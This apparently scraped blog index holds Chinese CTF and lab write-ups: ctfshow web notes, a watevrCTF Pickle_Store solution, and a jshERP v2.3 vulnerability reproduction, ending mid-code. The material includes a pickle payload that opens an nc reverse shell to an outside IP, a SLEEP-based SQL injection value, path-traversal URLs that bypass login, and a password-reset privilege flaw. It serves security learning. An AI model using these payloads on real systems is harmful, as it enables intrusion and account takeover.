只是一块饼干，不能存放任何隐私数据这里主要是如何查看cookie，虽然现在很简单，但一开始还真不知道\n我们只需F12然后存储探查器(可以自己添加cookie)和网络(Neetwork)就可以看到cookie了，我们拿到的被url编码了，记得解码\nweb11-20我算是明白了，之前这么多关都是用dirserach扫一下就出来了，只不过每次文件都不一样而已\n剩下的我感觉够了，没什么值得在这浪费时间的了，扫一个题目也要挺久的\n只看有点难度的web19和20\nweb19\n\n\n这是一个登录界面，我们看页面源代码，发现js代码对表单的数据有加密然后再提交加密后的表单数据，但我们看注释发现账号和密码，由于js代码属于前端验证，我们直接用POST请求把账号和密码发到后端即可\n\n\n至于另外的方法就是通过加密后的密码再通过加密函数反推出正确前端密码，但我实力不行，js都有点看不懂，密码方面的话在副方向会讲到\nweb20\n这个其实也是拿dirsearch扫一下，然后找到&#x2F;db&#x2F;db.mdb这个文件下载过来\n但打开这个文件的软件太久远了，就算了\n"},{"title":"[watevrCTF-2019]Pickle_Store","url":"/2025/09/09/watevrCTF-2019-Pickle-Store/","content":"[watevrCTF-2019]Pickle_Store进入题目发现是一个购买界面，再结合题目Pickle Store可以想到这是一个pickle反序列化题目\n题目说买下100的黄瓜可以获得flag，但是我们只有50，直接查看session，先进行base64解码发现不能完全解码，再结合session后面没有密钥签名，大概是pickle序列化数据\n直接进行解密\nimport pickleimport base64a = pickle.loads(base64.b64decode(b&#x27;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&#x27;))print(a)#&#123;&#x27;money&#x27;: 500, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;&#125;#确定是pickle序列化数据 我们可以直接进行反序列化\n\npickle序列化数据可以直接通过__reduce__这个魔术方法进行反弹shell\n尝试了发现如果我们篡改了money然后会进行数据校验返回500，也就导致我们伪造的数据无法使用。\n但是只要没过滤掉数据，我们直接反序列化就可以进行指令执行\nimport base64import pickleclass A(object):    def __reduce__(self):        return (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;nc 10.88.15.106 2333 -e/bin/sh&#x27;)&quot;,))a = A()print(base64.b64encode(pickle.dumps(a)))\n\n然后就是抓包改session\n\n"},{"title":"压缩包密码破解","url":"/2025/10/13/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/","content":"压缩包密码破解"},{"title":"华夏_ERP_CMS_v2.3漏洞复现","url":"/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"华夏_ERP_CMS_v2.3漏洞复现本来是想审PHP代码去漏洞挖掘的，但是部署了两个靶场都是不怎么适合我，于是就再从网上找了一个比较热门的靶场，也方便找漏洞解析，不用去CVE上面找那些漏洞了，CVE上的远古漏洞信息太少了\n项目部署\n我们从github上下载好源码后通过IDEA打开项目然后进行数据库配置\njshERP-2.3\\src\\main\\resources\\application.properties\n\n配置好我们的数据库，然后在MySQL中创建jsh_erp数据库，导入sql文件\njshERP-2.3\\docs\\jsh_erp.sql\n\n然后运行命令\nmvn clean install\n\n成功打开靶场\n\n\n\n\n\n\n1.XSS注入这个是最容易的，我们直接触发一下\n\n\n这个有两个地方可以触发，一个是单位中如果输入js代码可以触发反射型XSS，但是因为商品信息的原因无法储存\n然后就是添加商品信息，可以进行储存型XSS\n\n\n经过测试发现剩下的信息都可以触发XSS漏洞\n这个漏洞很简单，就是在前端的时候没有经过过滤就储存至数据库中，回显的时候也没有过滤和转义\n该前端代码在jshERP-2.3\\erp_web\\pages\\materials\\materials.html中\n我们先来看保存的代码\n$(&quot;#saveMaterial&quot;).off(&quot;click&quot;).on(&quot;click&quot;, function () &#123; //给saveMaterial按钮绑定点击事件    if (!$(&#x27;#Name&#x27;).val()) &#123;        $.messager.alert(&#x27;提示&#x27;, &#x27;名称不能为空！&#x27;, &#x27;warning&#x27;);        return;    &#125;    if(!$(&quot;#Unit&quot;).val() &amp;&amp; !$(&quot;#manyUnit&quot;).val()) &#123;        $.messager.alert(&#x27;提示&#x27;, &#x27;单位为必填项！&#x27;, &#x27;warning&#x27;);        return;    &#125;    if ($(&quot;#materialExtendData&quot;).datagrid(&#x27;getRows&#x27;).length==0)&#123;        $.messager.alert(&#x27;提示&#x27;, &#x27;请录入条码及相关信息！&#x27;, &#x27;warning&#x27;);        return;    &#125;    if (checkIsExist()) &#123;        return;    &#125;    var objInfo = $(&quot;#materialFM&quot;).serializeObject();  //serializeObject() 是一个 jQuery 插件方法，把表单中的 &lt;input&gt;、&lt;select&gt; 等元素序列化成一个 JS 对象。这个是收集materialFM表单的数据    objInfo.UnitId = $(&quot;#manyUnit&quot;).val();    objInfo.CategoryId =$(&quot;#parentId&quot;).val();//这两个则是将下拉框的值放入js对象中    //初始库存信息    var stockArr = [];    $(&quot;#initDepot input&quot;).each(function () &#123;        var id = $(this).attr(&quot;data-id&quot;);        var val = $(this).val();        var stockObj = &#123;&#125;;        stockObj.depotId = id;        stockObj.number = val;        stockArr.push(stockObj);    &#125;);    objInfo = accept(objInfo); //商品价格扩展    objInfo.stock = JSON.stringify(stockArr);    $.ajax(&#123;  //通过ajax将数据发送到后端        type: &quot;post&quot;,        url: url,   //发送到指定url的后端        dataType: &quot;json&quot;,        async: false,        data: (&#123;            info: JSON.stringify(objInfo) //设置请求体参数，也就是平时的post传参        &#125;),        success: function(res) &#123;            if(res &amp;&amp; res.code === 200) &#123;                $(&#x27;#materialDlg&#x27;).dialog(&#x27;close&#x27;);                //加载完以后重新初始化                var opts = $(&quot;#tableData&quot;).datagrid(&#x27;options&#x27;);                showMaterialDetails(opts.pageNumber, opts.pageSize);            &#125;        &#125;,        //此处添加错误处理        error: function () &#123;            $.messager.alert(&#x27;提示&#x27;, &#x27;保存商品信息异常，请稍后再试！&#x27;, &#x27;error&#x27;);            return;        &#125;    &#125;);&#125;);\n\n我们可以看到在通过ajax发送json数据到后端中没有经过过滤\n然后再来看回显代码\n//初始化系统基础信息function initMProperty() &#123;    $.ajax(&#123;        type: &quot;get&quot;,        url: &quot;/materialProperty/list&quot;,        dataType: &quot;json&quot;,        data: (&#123;            currentPage: 1,            pageSize: 100        &#125;),        success: function (res) &#123;            if(res &amp;&amp; res.code === 200)&#123;                if(res.data &amp;&amp; res.data.page) &#123;                    mPropertyList = res.data.page.rows; //属性列表 将json中的数据选择进行赋值                &#125;            &#125;        &#125;,        //此处添加错误处理        error: function () &#123;            $.messager.alert(&#x27;查询提示&#x27;, &#x27;查询信息异常，请稍后再试！&#x27;, &#x27;error&#x27;);            return;        &#125;    &#125;);&#125;function initMCData(parentid_search) &#123;    $.ajax(&#123;        type: &quot;get&quot;,        url: &quot;/materialCategory/getAllList&quot;,        data: (&#123;            parentId: parentid_search        &#125;),        //设置为同步        async: false,        dataType: &quot;json&quot;,        success: function (res) &#123;            if(res &amp;&amp; res.code === 200)&#123;                materialCategoryList = res.data;                if (materialCategoryList != null) &#123;                    options = &quot;&quot;;                    for (var i = 0; i &lt; materialCategoryList.length; i++) &#123;                        var materialCategory = materialCategoryList[i];                        types += materialCategory.id + &#x27;,&#x27;;                    &#125;                    types += parentid_search;                &#125; else &#123;                    types = parentid_search;                &#125;            &#125; else &#123;                $.messager.alert(&#x27;提示&#x27;, &#x27;查找系统基础信息异常,请与管理员联系！&#x27;, &#x27;error&#x27;);                return;            &#125;        &#125;    &#125;);&#125;\n\n无论是保存数据还是回显数据都未经过处理，触发了XSS漏洞\n2.SQL注入漏洞之前java sec code上的sql注入漏洞和PHP的一样，都是连接好数据库然后直接执行sql语句就行了但是这个我看使用的是MyBatis这一个框架\nMyBatis 是一个 Java 持久层框架，主要用于 将数据库操作（SQL）与 Java 对象映射起来，属于 ORM（Object-Relational Mapping）的一种轻量级实现，但它与 Hibernate 等全自动 ORM 框架不同，强调 手写 SQL 并手动映射。\nSqlSessionFactory：\n\n这是创建 SqlSession 的工厂，是 MyBatis 的“心脏”。它通常在应用启动时通过读取配置文件（如 mybatis-config.xml）被构建一次。\n\nSqlSession：\n\n代表一次与数据库的会话。它提供了执行 SQL 命令、获取映射器（Mapper）和管理事务的方法。每个线程都应该有它自己的 SqlSession 实例，使用后必须关闭。\n\n我们首先定义一个接口\npublic interface UserMapper &#123;    User selectUserById(int id);    List&lt;User&gt; selectAllUsers();    void insertUser(User user);&#125;\n\nMapper 接口：\n\n这是一个 Java 接口，你可以在其中定义数据库操作方法。MyBatis 会通过动态代理为你创建这个接口的实现类。接口中的方法名与 XML 文件中的 SQL 语句的 id 一一对应。\n\n这里面定义的方法和xml文件中定义的语句和参数必须一致，不然在编译的时候会报错\n然后我们就可以在xml文件中定义我们的预处理sql语句\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.example.mapper.UserMapper&quot;&gt; &lt;!-- 指定对应的接口全限定名 --&gt;        &lt;!-- 结果映射：将查询结果封装到 User 对象中 --&gt;    &lt;resultMap id=&quot;UserResult&quot; type=&quot;User&quot;&gt;        &lt;id property=&quot;id&quot; column=&quot;id&quot;/&gt;        &lt;result property=&quot;username&quot; column=&quot;username&quot;/&gt;        &lt;result property=&quot;email&quot; column=&quot;email&quot;/&gt;    &lt;/resultMap&gt;        &lt;!-- SQL 语句：id 与接口方法名对应 --&gt;    &lt;select id=&quot;selectUserById&quot; resultMap=&quot;UserResult&quot;&gt;        SELECT * FROM users WHERE id = #&#123;id&#125;    &lt;/select&gt;        &lt;select id=&quot;selectAllUsers&quot; resultMap=&quot;UserResult&quot;&gt;        SELECT * FROM users    &lt;/select&gt;        &lt;insert id=&quot;insertUser&quot; parameterType=&quot;User&quot;&gt;        INSERT INTO users (username, email) VALUES (#&#123;username&#125;, #&#123;email&#125;)    &lt;/insert&gt;&lt;/mapper&gt;\n\n然后我们可以在java代码中通过sqlSession调用getMapper方法实现接口，实际上是MyBatis提前为我们准备好了接口的实现类\n// 1. 获取 SqlSession（通常由 Spring 依赖注入管理，此处为示例）SqlSession sqlSession = sqlSessionFactory.openSession();try &#123;    // 2. 获取 Mapper 接口的代理实现    UserMapper mapper = sqlSession.getMapper(UserMapper.class);        // 3. 调用方法，MyBatis 会自动执行对应的 SQL    User user = mapper.selectUserById(1);    List&lt;User&gt; users = mapper.selectAllUsers();        User newUser = new User(&quot;Alice&quot;, &quot;alice@example.com&quot;);    mapper.insertUser(newUser);        // 4. 提交事务（如果是增删改）    sqlSession.commit();&#125; finally &#123;    // 5. 关闭会话    sqlSession.close();&#125;\n\n于是我们可以通过对应Mapper接口中定义的id调用方法然后返回执行结果，但是在执行的sql语句中存在两个特殊的语法#&#123;name&#125;和$&#123;name&#125;，虽然都是作为参数传递方式，但是有区别\n简单来说，它们的根本区别在于：\n\n#&#123;name&#125;：是参数占位符（预编译） -&gt; 安全\n$&#123;name&#125;：是字符串拼接（直接替换） -&gt; 危险\n\n也就是说$&#123;&#125;这种写法和直接执行sql语句没什么区别，我们可以通过在文件中搜寻$&#123;的方式来找到sql注入点\nMyBatis产生漏洞的情况\n使用Like语句\n在这种情况下使用 #&#123;&#125; 程序会报错，新手程序员就把 #号 改成了 $，这就照样导致了拼接的问题了。\n&lt;select id=&quot;findByUserNameVuln02&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;    select * from users where username like &#x27;%$&#123;_parameter&#125;%&#x27;&lt;/select&gt;\n\n正确的写法如下\n&lt;select id=&quot;findByUserNamesec&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;    select * from users where username like concat(&#x27;%&#x27;,#&#123;_parameter&#125;, &#x27;%&#x27;)&lt;/select&gt;\n\n通过concat进行拼接\nmysql:    select * from users where username like concat(&#x27;%&#x27;,#&#123;username&#125;,&#x27;%&#x27;)oracle:    select * from users where username like &#x27;%&#x27;||#&#123;username&#125;||&#x27;%&#x27;sqlserver:    select * from users where username like &#x27;%&#x27;+#&#123;username&#125;+&#x27;%&#x27;\n\n不同的数据库写法还不一样\n使用in语句\n使用in语句时直接使用 #&#123;&#125; 会报错，可能会存在使用 $&#123;&#125; 直接拼接，造成sql注入\n&lt;select id=&quot;findByUserNameVuln04&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;    select * from users where id in ($&#123;id&#125;)&lt;/select&gt;\n\n正确用法为使用 foreach，而不是将#替换为$\n&lt;select id=&quot;findByIdSec04&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;   SELECT   * from users WHERE id IN &lt;foreach collection=&quot;id&quot; item=&quot;id&quot; open=&quot;(&quot; close=&quot;)&quot; separator=&quot;,&quot;&gt;   #&#123;id&#125;   &lt;/foreach&gt;  &lt;/select&gt;\n\n\n\n使用order by语句\n和JDBC同理，使用 #&#123;&#125; 方式传参会导致order by语句失效，所以使用order by语句的时候还是需要做好过滤，最好的办法就是做白名单过滤\n\n\n找是找到了一堆使用$&#123;拼接sql语句进行执行的xml文件，但是这些并不是都能触发漏洞，我太菜了判断不了，所以只能可以触发和不能触发都看看\n我们先来看有没有上面那三种语句出现，然后就是需要观察我们的文件是否可以控制，我太菜了，只能看已经被发现的漏洞\n我在UserMapperEx.xml中找到\n&lt;select id=&quot;selectByConditionUser&quot; parameterType=&quot;com.jsh.erp.datasource.entities.UserExample&quot; resultMap=&quot;ResultMapEx&quot;&gt;    select user.id, user.username, user.login_name, user.position, user.email, user.phonenum,    user.description, user.remark,user.isystem,org.id as orgaId,user.tenant_id,org.org_abr,    rel.user_blng_orga_dspl_seq,rel.id as orgaUserRelId,    (select r.name from jsh_user_business ub    inner join jsh_role r on ub.value=concat(&quot;[&quot;,r.id,&quot;]&quot;) and ifnull(r.delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;    where ub.type=&#x27;UserRole&#x27; and ub.key_id=user.id limit 0,1) roleName    FROM jsh_user user    left join jsh_orga_user_rel rel on user.id=rel.user_id and ifnull(rel.delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;    left join jsh_organization org on rel.orga_id=org.id and  ifnull(org.org_stcd,&#x27;0&#x27;) !=&#x27;5&#x27;    where 1=1    and ifnull(user.status,&#x27;0&#x27;) not in(&#x27;1&#x27;,&#x27;2&#x27;)    &lt;if test=&quot;userName != null&quot;&gt;        and user.username like &#x27;%$&#123;userName&#125;%&#x27;    &lt;/if&gt;    &lt;if test=&quot;loginName != null&quot;&gt;        and user.login_name like &#x27;%$&#123;loginName&#125;%&#x27;    &lt;/if&gt;    order by rel.user_blng_orga_dspl_seq,user.id desc    &lt;if test=&quot;offset != null and rows != null&quot;&gt;        limit #&#123;offset&#125;,#&#123;rows&#125;    &lt;/if&gt;&lt;/select&gt;&lt;select id=&quot;countsByUser&quot; resultType=&quot;java.lang.Long&quot;&gt;    select count(user.id)    FROM jsh_user user    left join jsh_user_business ub on user.id=ub.key_id    left join jsh_orga_user_rel rel on user.id=rel.user_id and ifnull(rel.delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;    left join jsh_organization org on rel.orga_id=org.id and  ifnull(org.org_stcd,&#x27;0&#x27;) !=&#x27;5&#x27;    where 1=1    and ifnull(user.status,&#x27;0&#x27;) not in(&#x27;1&#x27;,&#x27;2&#x27;)    &lt;if test=&quot;userName != null&quot;&gt;        and user.username like &#x27;%$&#123;userName&#125;%&#x27;    &lt;/if&gt;    &lt;if test=&quot;loginName != null&quot;&gt;        and user.login_name like &#x27;%$&#123;loginName&#125;%&#x27;    &lt;/if&gt;&lt;/select&gt;\n\n这两个可能的利用点，于是去找对应的接口UserMapperEX.java\npublic interface UserMapperEx &#123;    List&lt;UserEx&gt; selectByConditionUser(            @Param(&quot;userName&quot;) String userName,            @Param(&quot;loginName&quot;) String loginName,            @Param(&quot;offset&quot;) Integer offset,            @Param(&quot;rows&quot;) Integer rows);    Long countsByUser(            @Param(&quot;userName&quot;) String userName,            @Param(&quot;loginName&quot;) String loginName);    List&lt;User&gt; getUserListByUserNameOrLoginName(@Param(&quot;userName&quot;) String userName,                                                @Param(&quot;loginName&quot;) String loginName);    int batDeleteOrUpdateUser(@Param(&quot;ids&quot;) String ids[], @Param(&quot;status&quot;) byte status);    List&lt;TreeNodeEx&gt; getNodeTree();    List&lt;TreeNodeEx&gt; getNextNodeTree(Map&lt;String, Object&gt; parameterMap);&#125;\n\n我们再来看在service层的方法，UserService.java，至于之前的select方法我没看到哪里用了，实际上应该也不能用\npublic Long countUser(String userName, String loginName)throws Exception &#123;    Long result=null;    try&#123;        result=userMapperEx.countsByUser(userName, loginName);    &#125;catch(Exception e)&#123;        JshException.readFail(logger, e);    &#125;    return result;&#125;\n\n我们先在控制器中找到使用这个方法的方法\n    @PostMapping(&quot;/addUser&quot;)    @ResponseBody    public Object addUser(@RequestParam(&quot;info&quot;) String beanJson, HttpServletRequest request)throws Exception&#123;//获取到前端传来的json数据        JSONObject result = ExceptionConstants.standardSuccess();//返回一个请求成功的标识        Long userNumLimit = Long.parseLong(request.getSession().getAttribute(&quot;userNumLimit&quot;).toString());//控制器从 session 获取到一个名为 userNumLimit 的用户数量限制。它会检查当前已有的用户数量，如果超过了限制，则抛出异常，阻止添加用户。        Long count = userService.countUser(null,null);//通过countUser获取数量        if(count&gt;= userNumLimit) &#123;            throw new BusinessParamCheckingException(ExceptionConstants.USER_OVER_LIMIT_FAILED_CODE,                    ExceptionConstants.USER_OVER_LIMIT_FAILED_MSG);        &#125; else &#123;            UserEx ue= JSON.parseObject(beanJson, UserEx.class);//将这个对象变为excel表格            userService.addUserAndOrgUserRel(ue);//调用这个方法添加数据        &#125;        return result;    &#125;\n\n/addUser路由中确实调用了这个方法，但是传入的两个参数怎么全都是null，而且触发漏洞的路由我都不知道访问的哪个路由，漏洞访问的是/user/list，但是我只在代码中看见\n@GetMapping(value = &quot;/getAllList&quot;)public BaseResponseInfo getAllList(HttpServletRequest request)throws Exception &#123;    BaseResponseInfo res = new BaseResponseInfo();    try &#123;        Map&lt;String, Object&gt; data = new HashMap&lt;String, Object&gt;();        List&lt;User&gt; dataList = userService.getUser();        if(dataList!=null) &#123;            data.put(&quot;userList&quot;, dataList);        &#125;        res.code = 200;        res.data = data;    &#125; catch(Exception e)&#123;        e.printStackTrace();        res.code = 500;        res.data = &quot;获取失败&quot;;    &#125;    return res;&#125;\n\n而且这个功能就是查找用户信息和/person/list的sql注入漏洞也是这个样子，这个搞不好是这个系统的一个自定义路由处理方法，问了GPT和DS都是不知道\n由于这个触发链实在过于复杂，其他sql注入漏洞也十分复杂，最后我得出的结论就是在知道哪个参数有漏洞的情况下就向哪个参数进行sql注入\n\n\n这个是原本的请求头，我们对其参数进行解码\n&#123;&quot;userName&quot;:&quot;&quot;,&quot;loginName&quot;:&quot;&quot;&#125;\n\n这个我们在countsByUser中知道是存在漏洞的，于是我们进行注入\n&#123;&quot;userName&quot;:&quot;&quot;,&quot;loginName&quot;:&quot;&#x27; AND SLEEP(5)--sss&quot;&#125;\n\n这个是原本执行的命令\nTime：0 ms - ID：com.jsh.erp.datasource.mappers.UserMapperEx.countsByUserExecute SQL：SELECT count(user.id) FROM jsh_user user LEFT JOIN jsh_user_business ub ON user.id = ub.key_id LEFT JOIN jsh_orga_user_rel rel ON rel.tenant_id = 63 AND user.id = rel.user_id AND ifnull(rel.delete_flag, &#x27;0&#x27;) != &#x27;1&#x27; LEFT JOIN jsh_organization org ON org.tenant_id = 63 AND rel.orga_id = org.id AND ifnull(org.org_stcd, &#x27;0&#x27;) != &#x27;5&#x27; WHERE user.tenant_id = 63 AND 1 = 1 AND ifnull(user.status, &#x27;0&#x27;) NOT IN (&#x27;1&#x27;, &#x27;2&#x27;)\n\n然后成功执行sleep，进行盲注\n\n\n我还注意到在执行sql语句的时候另外一个selectByConditionUser也被注入了\n Time：25050 ms - ID：com.jsh.erp.datasource.mappers.UserMapperEx.selectByConditionUserExecute SQL：SELECT user.id, user.username, user.login_name, user.position, user.email, user.phonenum, user.description, user.remark, user.isystem, org.id AS orgaId, user.tenant_id, org.org_abr, rel.user_blng_orga_dspl_seq, rel.id AS orgaUserRelId, (SELECT r.name FROM jsh_user_business ub INNER JOIN jsh_role r ON ub.value = concat(&quot;[&quot;, r.id, &quot;]&quot;) AND ifnull(r.delete_flag, &#x27;0&#x27;) != &#x27;1&#x27; WHERE ub.type = &#x27;UserRole&#x27; AND ub.key_id = user.id LIMIT 0, 1) roleName FROM jsh_user user LEFT JOIN jsh_orga_user_rel rel ON rel.tenant_id = 63 AND user.id = rel.user_id AND ifnull(rel.delete_flag, &#x27;0&#x27;) != &#x27;1&#x27; LEFT JOIN jsh_organization org ON org.tenant_id = 63 AND rel.orga_id = org.id AND ifnull(org.org_stcd, &#x27;0&#x27;) != &#x27;5&#x27; WHERE user.tenant_id = 63 AND 1 = 1 AND ifnull(user.status, &#x27;0&#x27;) NOT IN (&#x27;1&#x27;, &#x27;2&#x27;) AND user.login_name LIKE &#x27;%&#x27; AND SLEEP(5) ORDER BY rel.user_blng_orga_dspl_seq, user.id DESC LIMIT 0, 15\n\n但是不知道为什么注释符没起作用，还被删掉了，不知道有没有作用\n3.暴力破解漏洞启动靶场的时候会给出账号密码\njsh123456\n\n先不说这个密码和名字都有点简单，虽然可以自己改。但是没有次数登录限制，也就是可以无限制次数进行爆破。\n最重点在于\n\n\n这个密码储存在数据库中的加密方式就是简单的md5加密，没有密匙，可以简单的通过MD5爆破得到密码\n\n\n\n\n4.白名单越权我们先来看下Filter中的代码\npublic void doFilter(ServletRequest request, ServletResponse response,                     FilterChain chain) throws IOException, ServletException &#123;    HttpServletRequest servletRequest = (HttpServletRequest) request;    HttpServletResponse servletResponse = (HttpServletResponse) response;    String requestUrl = servletRequest.getRequestURI();    //具体，比如：处理若用户未登录，则跳转到登录页    Object userInfo = servletRequest.getSession().getAttribute(&quot;user&quot;);    if(userInfo!=null) &#123; //如果已登录，不阻止        chain.doFilter(request, response);        return;    &#125;    if (requestUrl != null &amp;&amp; (requestUrl.contains(&quot;/doc.html&quot;) ||        requestUrl.contains(&quot;/register.html&quot;) || requestUrl.contains(&quot;/login.html&quot;))) &#123;        chain.doFilter(request, response);        return;    &#125;    if (verify(ignoredList, requestUrl)) &#123;        chain.doFilter(servletRequest, response);        return;    &#125;    if (null != allowUrls &amp;&amp; allowUrls.length &gt; 0) &#123;        for (String url : allowUrls) &#123;            if (requestUrl.startsWith(url)) &#123;                chain.doFilter(request, response);                return;            &#125;        &#125;    &#125;    servletResponse.sendRedirect(&quot;/login.html&quot;);&#125;\n\n这个是一个简单的登录校验，对于我们还未登录时的Url是进行了白名单过滤，但是这个过滤很幽默，没有过滤掉../，就导致我们只要在一开始访问白名单文件，然后后面通过目录穿越到根目录，我们就可以通过路由解析访问到白名单以外的html文件和路由\n正常情况下，我们访问home.html等白名单以外的文件和路由则会返回302跳转\n\n\n\n\npayload1：\n/login.html/../home.html\n\n这个先通过login.html绕过白名单，然后通过目录穿越符回到根目录于是就可以重新进行目录解析\n\n\n\n\n然后我们再接着来看第二个判断条件\nprivate static String regexPrefix = &quot;^.*&quot;;private static String regexSuffix = &quot;.*$&quot;;private static boolean verify(List&lt;String&gt; ignoredList, String url) &#123;    for (String regex : ignoredList) &#123;        Pattern pattern = Pattern.compile(regexPrefix + regex + regexSuffix);        Matcher matcher = pattern.matcher(url);        if (matcher.matches()) &#123;            return true;        &#125;    &#125;    return false;&#125;\n\n这个代码使用循环将ignoredList数组中的进行正则匹配，经过处理ignoredList变为\n[&quot;.css&quot;, &quot;.js&quot;, &quot;.jpg&quot;, &quot;.png&quot;, &quot;.gif&quot;, &quot;.ico&quot;]\n\n于是正则匹配变为\n^.*.css.*$\n\n这里面.*表示开头可以是任意字符匹配多次，后面也是一样，如果匹配到了则放行，虽然不知道代码为什么怎么写，但是这里的确可以进行目录穿越，还是因为没有过滤目录穿越符\npayload2\n/fuck.css/../home.html\n\n也是只需要包含.css即可\n\n\n\n\n还有最后一层判断\nif (null != allowUrls &amp;&amp; allowUrls.length &gt; 0) &#123;    for (String url : allowUrls) &#123;        if (requestUrl.startsWith(url)) &#123;            chain.doFilter(request, response);            return;        &#125;    &#125;&#125;\n\n这个定义了一些可以直接访问的路由，但还是目录穿越符梭哈\n@WebInitParam(name = &quot;filterPath&quot;,value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)&#125;)if (!StringUtils.isEmpty(filterPath)) &#123;            allowUrls = filterPath.contains(&quot;#&quot;) ? filterPath.split(&quot;#&quot;) : new String[]&#123;filterPath&#125;;        &#125;\n\n于是我们可以访问的路由都有了\npayload3\n/user/login/../../home.html\n\n这个代码应该是为了在没登录的情况下也可以向这些路由发ajax请求\n\n\n\n\n5.越权漏洞之前说的越权只是在未登录的情况下通过目录穿越符来到项目根目录再写路由访问不可访问的文件，还有一个越权漏洞，而这个越权漏洞可以进行垂直越权重置密码\n我们有三种账号\n\n\n其中超管admin的密码不能被重置，只能在后台修改，我们的jsh账号更是看不到admin账号，然后就是无论哪个账号都不能删除用户，然后就是也只能重置密码为123456，不能对自己以外的密码进行修改。\n我们在进行编辑信息的时候，前端代码将信息传递至user/updateUser路由，重置密码时则是/restPwd路由\n@PostMapping(value = &quot;/resetPwd&quot;)public String resetPwd(@RequestParam(&quot;id&quot;) Long id,                                 HttpServletRequest request) throws Exception &#123;    Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();    String password = &quot;123456&quot;;    String md5Pwd = Tools.md5Encryp(password);    int update = userService.resetPwd(md5Pwd, id);//调用了service层的代码    if(update &gt; 0) &#123;        return returnJson(objectMap, message, ErpInfo.OK.code);    &#125; else &#123;        return returnJson(objectMap, message, ErpInfo.ERROR.code);    &#125;&#125;\n\n将原始密码进行MD5加密后直接和id一起丢到service层代码中了\n    @Transactional(value = &quot;transactionManager&quot;, rollbackFor = Exception.class)    public int resetPwd(String md5Pwd, Long id) throws Exception&#123;        int result=0;        logService.insertLog(&quot;用户&quot;,                new StringBuffer(BusinessConstants.LOG_OPERATION_TYPE_EDIT).append(id).toString(),                ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest());        User u = getUser(id);//通过id获取到对应的用户信息        String loginName = u.getLoginName();//如果获取到的信息Username为admin则禁止重置 但是就简单的通过id判断用户信息，也没有session校验，也就是我可以发包重置admin以外的密码        if(&quot;admin&quot;.equals(loginName))&#123;            logger.info(&quot;禁止重置超管密码&quot;);        &#125; else &#123;            User user = new User();            user.setId(id);            user.setPassword(md5Pwd);//这个就是简单的将密码赋值给对象            try&#123;                result=userMapper.updateByPrimaryKeySelective(user);            &#125;catch(Exception e)&#123;                JshException.writeFail(logger, e);            &#125;        &#125;        return result;    &#125;\n\n我们来看下updateByPrimaryKeySelective方法执行的sql语句\n&lt;update id=&quot;updateByPrimaryKeySelective&quot; parameterType=&quot;com.jsh.erp.datasource.entities.User&quot;&gt;  update jsh_user  &lt;set&gt;    &lt;if test=&quot;username != null&quot;&gt;      username = #&#123;username,jdbcType=VARCHAR&#125;,    &lt;/if&gt;    &lt;if test=&quot;loginName != null&quot;&gt;      login_name = #&#123;loginName,jdbcType=VARCHAR&#125;,    &lt;/if&gt;    &lt;if test=&quot;password != null&quot;&gt;      password = #&#123;password,jdbcType=VARCHAR&#125;,    &lt;/if&gt;  &lt;/set&gt;  where id = #&#123;id,jdbcType=BIGINT&#125;&lt;/update&gt;\n\n中间删掉了一堆没用的其他属性，我们要做的就是改密码。\n本来是不能直接修改账号的，但是我们可以通过抓这个包通过修改json数据修改\n\n\n虽然好像还没有找到如何修改密码，但是好像有意外收获。\n但是我又发现不知道为什么我可以访问到静态目录，难道没有添加的功能不需要过过滤器吗，这样通过html触发的确比在前端按键中触发要简单一点\n\n\n我们来看下修改密码的代码\n@PostMapping(value = &quot;/updatePwd&quot;)public String updatePwd(@RequestParam(&quot;userId&quot;) Long userId, @RequestParam(&quot;password&quot;) String password,                        @RequestParam(&quot;oldpwd&quot;) String oldpwd, HttpServletRequest request)throws Exception &#123;    Integer flag = 0;    Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();    try &#123;        User user = userService.getUser(userId);        String oldPassword = Tools.md5Encryp(oldpwd);        String md5Pwd = Tools.md5Encryp(password);//通过md5进行测试，但是这个太容易进行碰撞了        //必须和原始密码一致才可以更新密码        if(user.getLoginName().equals(&quot;jsh&quot;))&#123;            flag = 3; //管理员jsh不能修改密码        &#125; else if (oldPassword.equalsIgnoreCase(user.getPassword())) &#123;            user.setPassword(md5Pwd);            flag = userService.updateUserByObj(user); //1-成功        &#125; else &#123;            flag = 2; //原始密码输入错误        &#125;        objectMap.put(&quot;status&quot;, flag);        if(flag &gt; 0) &#123;            return returnJson(objectMap, message, ErpInfo.OK.code);        &#125; else &#123;            return returnJson(objectMap, message, ErpInfo.ERROR.code);        &#125;    &#125; catch (Exception e) &#123;        logger.error(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;修改用户ID为 ： &quot; + userId + &quot;密码信息失败&quot;, e);        flag = 3;        objectMap.put(&quot;status&quot;, flag);        return returnJson(objectMap, message, ErpInfo.ERROR.code);    